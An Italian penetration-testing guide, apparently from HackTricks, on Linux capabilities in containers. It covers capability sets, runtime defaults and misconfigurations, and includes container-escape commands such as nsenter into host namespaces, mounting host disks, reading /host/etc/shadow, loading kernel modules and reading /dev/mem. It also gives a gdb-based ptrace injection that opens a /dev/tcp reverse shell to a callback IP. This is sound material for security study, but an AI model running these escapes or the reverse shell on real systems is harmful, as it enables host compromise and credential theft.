# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Le Linux capabilities sono uno degli elementi più importanti della container security perché rispondono a una domanda sottile ma fondamentale: **che cosa significa davvero "root" all'interno di un container?** Su un normale sistema Linux, storicamente l'UID 0 implicava un insieme di privilegi molto ampio. Nei kernel moderni, tale privilegio è suddiviso in unità più piccole chiamate capabilities. Un processo può essere eseguito come root e tuttavia non avere molte operazioni potenti se le capabilities pertinenti sono state rimosse. <sup>[[1]](#references)</sup>

I container dipendono fortemente da questa distinzione. Molti workload vengono ancora avviati come UID 0 all'interno del container per motivi di compatibilità o semplicità. Senza il dropping delle capabilities, questo sarebbe troppo pericoloso. Con il dropping delle capabilities, un processo root containerizzato può comunque eseguire molte attività ordinarie all'interno del container, mentre gli vengono negate operazioni più sensibili del kernel. Per questo una shell del container che mostra `uid=0(root)` non significa automaticamente "host root" e nemmeno "privilegio kernel ampio". I capability set determinano quanto valga realmente quell'identità root.

Per il riferimento completo alle Linux capabilities e numerosi esempi di abuso, vedere:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funzionamento

Le capabilities vengono tracciate in diversi set, inclusi permitted, effective, inheritable, ambient e bounding set. Per molte valutazioni dei container, la semantica esatta del kernel relativa a ciascun set è meno importante, nell'immediato, rispetto alla domanda pratica finale: **quali operazioni privilegiate può eseguire con successo questo processo in questo momento e quali future acquisizioni di privilegi sono ancora possibili?** <sup>[[1]](#references)</sup>

Questo è importante perché molte tecniche di breakout sono in realtà problemi di capabilities mascherati da problemi dei container. Un workload con `CAP_SYS_ADMIN` può accedere a una quantità enorme di funzionalità del kernel che un normale processo root di un container non dovrebbe utilizzare. Un workload con `CAP_NET_ADMIN` diventa molto più pericoloso se condivide anche il network namespace dell'host. Un workload con `CAP_SYS_PTRACE` diventa molto più interessante se può vedere i processi dell'host tramite la condivisione del PID. In Docker o Podman questo può apparire come `--pid=host`; in Kubernetes di solito appare come `hostPID: true`.

In altre parole, il capability set non può essere valutato in isolamento. Deve essere analizzato insieme a namespaces, seccomp e policy MAC.

## Lab

Un modo molto diretto per ispezionare le capabilities all'interno di un container è:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Puoi anche confrontare un container più restrittivo con uno a cui sono state aggiunte tutte le capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Per vedere l'effetto di un'aggiunta restrittiva, prova a rimuovere tutto e ad aggiungere nuovamente una sola capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Questi piccoli esperimenti aiutano a dimostrare che un runtime non sta semplicemente attivando o disattivando un booleano chiamato "privileged". Sta modellando la superficie di privilegi effettivamente disponibile al processo.

## Capabilities ad alto rischio

Le capabilities diventano primitive di escape solo quando la loro operazione raggiunge una **risorsa governata dall'host**. Le combinazioni ad alto rischio ricorrenti sono:

- **`CAP_SYS_ADMIN`** insieme a un PID dell'host, a un block device o a un percorso di controllo del kernel scrivibile. Per entrare in un mount namespace di destinazione è inoltre necessaria `CAP_SYS_CHROOT`; per montare un filesystem basato su block device è necessaria `CAP_SYS_ADMIN` nell'initial user namespace.
- **`CAP_SYS_PTRACE`** insieme alla visibilità dei PID dell'host e a un processo dell'host a cui sia possibile fare attach. `CAP_SYS_ADMIN` non è necessaria per l'injection tramite ptrace.
- **`CAP_DAC_OVERRIDE` o `CAP_DAC_READ_SEARCH`** insieme a un filesystem dell'host raggiungibile. Queste capabilities aggirano controlli DAC diversi, ma non creano una vista del filesystem dell'host.
- **`CAP_SYS_MODULE`** nell'initial user namespace insieme a un modulo accettato e compatibile con il kernel. I container Linux ordinari condividono il kernel del nodo; i runtime basati su VM o userspace-kernel modificano questo confine.
- **`CAP_MKNOD`** nell'initial user namespace insieme a un device reale dell'host già consentito dal device cgroup. La creazione di un node non aggira il device cgroup.
- **`CAP_SYS_RAWIO`** insieme a un'interfaccia esposta e utilizzabile per l'accesso a memoria, porte I/O, PCI o al controllo dei device.
- **`CAP_SYS_BOOT`** insieme all'initial PID namespace per un reboot dell'host, oppure a un percorso kexec utilizzabile e autorizzato per la sostituzione del kernel.
- **`CAP_NET_ADMIN`** nell'host network namespace per il controllo diretto dello stato di rete del nodo. **`CAP_NET_RAW`** può partecipare a un escape specifico per protocollo, ma i raw socket da soli non costituiscono una shell sul nodo.

`CAP_SYS_CHROOT` non è deliberatamente elencata come capability di escape autonoma. Può essere necessaria per `setns()` di un mount namespace e può rendere più semplice l'utilizzo di un albero dell'host già accessibile, ma `chroot()` da solo non espone quell'albero né concede nuovi permessi sul filesystem. Analogamente, `CAP_BPF` e `CAP_PERFMON` espongono una potente superficie di telemetry e di attacco del kernel, ma, in assenza di una vulnerabilità separata del kernel, le loro operazioni ordinarie non costituiscono generic container escapes.

## Utilizzo nei runtime

Docker, Podman, gli stack basati su containerd e CRI-O usano tutti controlli sulle capabilities, ma le impostazioni predefinite e le interfacce di gestione differiscono. Docker le espone direttamente tramite flag come `--cap-drop` e `--cap-add`. Podman espone controlli simili e li combina comunemente con l'esecuzione rootless come ulteriore livello di sicurezza. Kubernetes espone l'aggiunta e la rimozione delle capabilities tramite il `securityContext` del Pod o del container; i runtime di livello inferiore esprimono i set risultanti nella configurazione del runtime OCI. Anche gli ambienti system-container come LXC e Incus si basano sul controllo delle capabilities, ma la loro più ampia integrazione con l'host può indurre gli operatori a rilassare le impostazioni predefinite più aggressivamente di quanto farebbero per un application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Lo stesso principio vale per tutti: una capability che è tecnicamente possibile concedere non è necessariamente una capability che dovrebbe essere concessa. Molti incidenti reali iniziano quando un operatore aggiunge una capability semplicemente perché un workload non funzionava con una configurazione più restrittiva e il team aveva bisogno di una soluzione rapida.

## Misconfigurazioni

L'errore più evidente è **`--cap-add=ALL`** nelle CLI in stile Docker/Podman, ma non è l'unico. Nella pratica, un problema più comune è concedere una o due capabilities estremamente potenti, soprattutto `CAP_SYS_ADMIN`, per "far funzionare l'applicazione" senza comprendere anche le implicazioni relative a namespace, seccomp e mount. Un'altra modalità comune di failure consiste nel combinare capabilities aggiuntive con la condivisione dei namespace dell'host. In Docker o Podman questo può apparire come `--pid=host`, `--network=host` o `--userns=host`; in Kubernetes l'esposizione equivalente appare solitamente tramite impostazioni del workload come `hostPID: true` o `hostNetwork: true`. Ognuna di queste combinazioni modifica ciò che la capability può effettivamente influenzare.

È inoltre comune che gli amministratori ritengano che, poiché un workload non è completamente `--privileged`, sia ancora significativamente limitato. A volte è così, ma in altri casi il posture effettivo è già abbastanza vicino a quello privileged da rendere operativamente irrilevante la distinzione.

## Abuse

Inizia registrando gli effective set, il mapping dello user namespace, lo stato di seccomp, i namespace, i mount e i device. Un nome di capability privo di questo contesto non dimostra un escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespace e block devices

Con la visibilità dei PID dell'host, `CAP_SYS_ADMIN` può accedere ai namespace dell'host. L'operazione sul mount namespace richiede anche `CAP_SYS_CHROOT` nel namespace utente del chiamante.

**Verifica la capability e il confinamento:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumera el objetivo:** confirma el uso compartido de PID del host a partir de la configuración del contenedor/Pod o de una lista inequívoca de procesos del host; después, inspecciona los namespaces del objetivo. También existe un PID 1 local en los namespaces de PID privados, por lo que su sola presencia no demuestra el uso compartido de PID del host.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Sfrutta il percorso del namespace:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
I controlli delle capabilities devono avere esito positivo negli user namespaces che possiedono i target. `--pid=host` o `hostPID: true` in Kubernetes forniscono visibilità; non forniscono le capabilities.

Per il percorso alternativo del dispositivo a blocchi, **enumera** i candidati, quindi **exploit** il filesystem accessibile montando prima il candidato convalidato in sola lettura:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Il nodo del dispositivo deve esistere, il device cgroup deve consentirlo e i mount di block filesystem richiedono `CAP_SYS_ADMIN` nel namespace utente iniziale. Una root dell'host già montata su `/host` fornisce accesso all'host **senza** `CAP_SYS_ADMIN`; `chroot /host` è solo una comodità e richiede separatamente `CAP_SYS_CHROOT`.

### Root dell'host raggiungibile: esecuzione diretta dal filesystem

Se la root dell'host è già montata su `/host`, verifica prima il mount, quindi usa direttamente l'accesso esistente. Questo percorso non dipende da `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Se `chroot()` non è disponibile, ma il binario dell'host è compatibile con l'architettura e il loader del container, spesso può essere chiamato attraverso l'albero montato:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Le letture e scritture dirette in `/host` costituiscono già una compromissione del filesystem dell'host. `chroot()` o l'esecuzione di un binario dell'host rendono semplicemente più comodo tale accesso; nessuna delle due operazioni crea il mount dell'host o bypassa un mount in sola lettura o una policy MAC.

### `CAP_SYS_PTRACE`: host-process injection

Con la visibilità dei PID dell'host e `CAP_SYS_PTRACE` nel namespace utente del target, GDB può fare in modo che un processo host approvato chiami `system()`. `CAP_SYS_ADMIN` non è necessaria.

**Verifica la capability e i controlli di attach:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Enumera y selecciona un objetivo desechable:** confirma el uso compartido de PID del host mediante la configuración o una lista inequívoca de procesos del nodo; nunca selecciones el PID 1 ni un daemon crítico.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Sfrutta il processo selezionato:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Il target deve consentire l’attach e avere un simbolo `system()` utilizzabile e un percorso per il payload Bash. Yama, lo stato non-dumpable, seccomp, gli user namespaces e la policy MAC possono bloccare la chain. GDB arresta il target mentre è collegato, quindi usa solo un processo da laboratorio usa e getta.

### `CAP_DAC_OVERRIDE` e `CAP_DAC_READ_SEARCH`: file protetti dell’host

Queste capabilities non espongono il filesystem dell’host. Se `/host` è già un mount dell’host, `CAP_DAC_READ_SEARCH` può bypassare i controlli DAC di lettura/ricerca e `CAP_DAC_OVERRIDE` può inoltre bypassare i normali controlli DAC di scrittura:

**Verifica le capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumerare il filesystem esposto dell'host e i permessi del target:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Sperimenta i bypass di lettura e scrittura** in un laboratorio usa e getta:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Un mount in sola lettura e le regole LSM continuano ad applicarsi. `CAP_DAC_READ_SEARCH` autorizza inoltre `open_by_handle_at()`, ma un breakout come Shocker richiede anche un file descriptor di mount per lo stesso filesystem sottostante, handle validi o individuabili, un layout compatibile del filesystem/storage e l'assenza di blocchi da parte del runtime o dell'LSM. Non fornisce accesso arbitrario a ogni filesystem esterno al mount namespace.

### `CAP_SYS_MODULE`: esecuzione nel kernel condiviso

In un normale container Linux, un modulo accettato viene eseguito nel kernel condiviso dell'host.

**Verifica la capability e l'ambito del user namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumerare i prerequisiti per il caricamento dei moduli:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Esegui l'exploit solo con un proof module compatibile e pre-revisionato su un nodo usa e getta:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
La capability deve essere effettiva nell'user namespace iniziale. La versione e la configurazione del kernel, le firme dei moduli, il lockdown, seccomp e i criteri LSM devono consentire il caricamento. Kata, gVisor, l'isolamento Hyper-V e runtime simili modificano il boundary del kernel raggiunto dal workload.

### `CAP_MKNOD`: creare un handle di dispositivo consentito

`CAP_MKNOD` crea un device node, ma non elude il device cgroup. La creazione dei device non è namespaced, quindi la capability deve essere effettiva nell'user namespace iniziale.

**Verifica la capability e l'ambito dell'user namespace:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumera i dispositivi reali, i relativi numeri major/minor e qualsiasi allowlist cgroup-v1 visibile:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploit un candidato ext-family validato in sola lettura:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Altri filesystem richiedono uno strumento read-only corrispondente; per montare il device è inoltre necessario `CAP_SYS_ADMIN`. `Operation not permitted` durante l'apertura del nodo creato indica generalmente che il cgroup dei device continua a bloccarlo. Con cgroup v2, l'accesso ai device viene comunemente applicato tramite BPF e non esiste alcun file `devices.list`, quindi un'apertura riuscita è il test decisivo.

### `CAP_SYS_RAWIO`: interfaccia raw-I/O esposta

Non esiste un payload generico portabile: gli indirizzi validi e gli effetti dipendono dall'hardware e dalla configurazione del kernel.

**Verifica la capability e l'ambito del namespace utente:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Elencare le interfacce raw, l'hardware e i driver esposti:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Esegui l'Exploit solo con una proof approvata per il dispositivo e l'intervallo di indirizzi identificati.** Se `/dev/mem` è l'interfaccia approvata dal laboratorio, questo template dimostra la divulgazione della memoria del nodo senza stamparne il contenuto:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
L'indirizzo deve provenire dalla mappa hardware del lab, perché la lettura di alcune regioni MMIO può avere effetti collaterali. Un comando generico di scrittura in memoria sarebbe fuorviante e pericoloso: lo stesso indirizzo può essere innocuo su una macchina e controllare l'hardware o la memoria del kernel su un'altra. I device cgroup, i permessi del filesystem, `/dev/mem` in modalità strict, il kernel lockdown, la virtualizzazione e i criteri LSM impediscono comunemente un accesso utile.

### `CAP_SYS_BOOT`: reboot del namespace o sostituzione del kernel

In un namespace PID privato, `reboot()` termina il processo init di quel namespace invece di riavviare l'host. Pertanto, per avere un impatto sul reboot dell'host è necessario il namespace PID iniziale, normalmente tramite la condivisione dei PID dell'host. Un percorso kexec richiede inoltre un'immagine del kernel compatibile e criteri permissivi per il lockdown e le firme:

**Verifica la capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumerare i prerequisiti di PID namespace e kexec:** confermare la condivisione dei PID dell'host dalla configurazione del workload, perché un collegamento al PID namespace da solo non rivela se si tratta del namespace iniziale del nodo.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Usa l'exploit solo quando il riavvio di un nodo di laboratorio usa e getta è l'esercizio esplicito:**
```bash
sync
reboot -f
```
Non eseguire quel comando né caricare un kernel su un nodo condiviso solo per dimostrare la capability. In un namespace PID privato termina soltanto il processo init di quel namespace e non dimostra alcun impatto sull'host.

### `CAP_NET_ADMIN` e `CAP_NET_RAW`: percorsi di rete dell'host

`CAP_NET_ADMIN` influisce soltanto sul namespace di rete corrente.

**Controlla le capability e il confinamento:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumerare la rete corrente e confermare il networking dell'host dalla configurazione del workload:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Esercitare `CAP_NET_ADMIN` in modo reversibile:** con il networking dell'host, l'interfaccia temporanea è un'interfaccia del nodo.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` consente socket RAW e PACKET, ma non è una host shell generica. Per **enumerare** la chain GCE documentata, verifica la route dei metadata e acquisisci se il traffico plaintext del guest-agent è osservabile:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Se esistono i prerequisiti corrispondenti, **exploit** la chain specifica dell’environment come documentato in [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): cattura la richiesta e lo stato della sequenza, inietta la risposta metadata contraffatta contenente una chiave SSH, quindi verifica l’accesso all’host. La chain richiedeva root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, traffico plaintext verso i metadata GCE e una richiesta del guest-agent soggetta a race condition; i moderni comportamenti del transport o dell’agent possono interromperla.

## Controlli

L’obiettivo dei capability checks non è soltanto eseguire il dump dei valori grezzi, ma comprendere se il processo dispone di privilegi sufficienti per rendere pericolose il suo namespace corrente e la situazione dei mount.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Cosa è interessante qui:

- `capsh --print` è il modo più semplice per individuare capabilities ad alto rischio come `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La riga `CapEff` in `/proc/self/status` indica cosa è effettivamente attivo ora, non solo cosa potrebbe essere disponibile in altri set.
- Un capability dump diventa molto più importante se il container condivide anche i namespace PID, di rete o degli utenti dell'host, oppure dispone di mount dell'host scrivibili.

Dopo aver raccolto le informazioni grezze sulle capabilities, il passaggio successivo è l'interpretazione. Chiediti se il processo è root, se i user namespaces sono attivi, se i namespace dell'host sono condivisi, se seccomp è in modalità enforcing e se AppArmor o SELinux limitano ancora il processo. Un capability set, da solo, è solo una parte del quadro, ma spesso è la parte che spiega perché un container breakout funziona e un altro fallisce partendo dalla stessa situazione apparente.

## Default del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Capability set ridotto per impostazione predefinita | Docker mantiene una allowlist predefinita di capabilities e rimuove le altre | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Capability set ridotto per impostazione predefinita | I container Podman sono unprivileged per impostazione predefinita e utilizzano un modello di capabilities ridotto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Eredita i default del runtime se non modificati | Se non viene specificato `securityContext.capabilities`, il container riceve il capability set predefinito del runtime | `securityContext.capabilities.add`, omettere `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Di solito il default del runtime | Il set effettivo dipende dal runtime e dal Pod spec | come nella riga Kubernetes; anche la configurazione diretta OCI/CRI può aggiungere esplicitamente capabilities |

Per Kubernetes, il punto importante è che l'API non definisce un unico capability set predefinito universale. Se il Pod non aggiunge o rimuove capabilities, il workload eredita il default del runtime per quel nodo.

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
